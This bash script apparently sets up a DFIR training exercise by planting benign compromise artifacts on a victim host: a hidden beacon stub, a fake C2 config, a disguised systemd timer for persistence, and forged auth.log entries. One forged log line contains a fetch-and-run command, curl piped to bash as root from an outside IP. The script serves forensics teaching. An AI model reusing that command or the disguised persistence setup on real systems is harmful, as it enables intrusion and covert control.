#!/usr/bin/env bash
# Compromised victim — plant BENIGN forensic artifacts for the DFIR investigation.
# These are harmless stand-ins (no real malware, no real C2): a beacon stub that
# only timestamps a local file, fake persistence, and suspicious-looking log lines.
# Idempotent. Stands in for the deferred compromise ACTIVITY (OP-ACT).
set -euo pipefail

# 1) "Beacon" payload + fake C2 config (artifact: suspicious /opt dropper).
install -d -m 0755 /opt/.sysupdate
cat > /opt/.sysupdate/agent.sh <<'SH'
#!/usr/bin/env bash
# SIMULATED beacon — does nothing harmful; only logs a heartbeat locally.
echo "beacon $(date -u +%FT%TZ) -> 185.234.219.45:443" >> /opt/.sysupdate/.hb
SH
chmod 0755 /opt/.sysupdate/agent.sh
printf 'C2=185.234.219.45:443\nUA=Mozilla/4.0 (compatible)\nJITTER=37\n' \
  > /opt/.sysupdate/config.ini

# 2) Persistence via a systemd timer (classic DFIR finding).
cat > /etc/systemd/system/sysupdate.service <<'UNIT'
[Unit]
Description=System Update Helper
[Service]
Type=oneshot
ExecStart=/opt/.sysupdate/agent.sh
UNIT
cat > /etc/systemd/system/sysupdate.timer <<'UNIT'
[Unit]
Description=System Update Helper schedule
[Timer]
OnBootSec=120
OnUnitActiveSec=300
[Install]
WantedBy=timers.target
UNIT
systemctl daemon-reload
systemctl enable --now sysupdate.timer || true

# 3) A YARA-detectable dropper (custom benign marker — NOT EICAR, won't trip AV).
printf 'rule_marker: AXRANGE_SIM_MALWARE_DO_NOT_DETONATE\npayload: (simulated)\n' \
  > /tmp/.cache.bin

# 4) Suspicious auth events (idempotent append, guarded by a marker).
LOG=/var/log/auth.log; [ -e "$LOG" ] || LOG=/var/log/incident_auth.log
if ! grep -q "AXRANGE-SIM" "$LOG" 2>/dev/null; then
  {
    echo "$(date -u '+%b %e %T') victim sshd[4021]: Accepted password for root from 185.234.219.45 port 51020 ssh2 # AXRANGE-SIM"
    echo "$(date -u '+%b %e %T') victim sudo: www-data : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c curl -s 185.234.219.45/x|bash # AXRANGE-SIM"
  } >> "$LOG"
fi

echo "victim artifacts planted (benign): persistence timer, beacon stub, dropper, log IOCs"
